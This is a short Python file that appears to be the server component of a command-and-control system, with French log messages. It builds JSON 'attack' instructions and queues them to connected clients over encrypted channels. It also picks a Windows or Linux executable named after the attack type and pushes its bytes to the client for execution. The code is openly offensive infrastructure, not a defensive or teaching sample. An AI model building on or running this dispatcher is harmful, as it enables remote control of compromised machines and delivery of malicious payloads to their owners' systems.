import json
import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty


def format_attack_data(type, id, data):
    
    json_data = {
        "id": str(id),
        "attack": type
    }

    # Update the dictionary with additional data
    json_data.update(data)

    # Convert the dictionary to a JSON string
    json_string = json.dumps(json_data)

    return str(json_string)




def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv, client_reception_queue, client_emission_queue, logger):
    #Récupérer os du client 
    if client_os == "windows":
        executable_path = ROOT_PATH + 'actions/windows/' + attack_type + '.exe'
    else:
        executable_path = ROOT_PATH + 'actions/linux/' + attack_type

    if os.path.isfile(executable_path):
        with open(executable_path, 'rb') as f:
            executable_data = f.read()
        
            client_emission_queue.put(executable_data)
            print("\t[+] L'exécutable a été envoyé")
            logger.info("L'exécutable a été envoyé")

                        
    else:
        print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
        logger.error("L'exécutable n'a pas été trouvé sur le serveur")



def execute_attack(client, attack, logger):
    print("\t[+] sending attack to " + str(client['addr']))
    logger.info("sending attack to " + str(client['addr']))

    # Récupération des données de l'attaque
    # print("\t[+] data de l'attack : " + str(attack))
    attack_data = json.loads(attack[4])
    attack_type = attack[2]
    attack_id = attack[0]

    data_to_send = format_attack_data(attack_type, attack_id, attack_data)


    print("\t[+] data_to_send : " + str(data_to_send))
    logger.info("data_to_send : " + str(data_to_send))

    client['emission_queue'].put(data_to_send.encode())

    print("\t[+] instruction envoyée")
    logger.info("instruction envoyée")
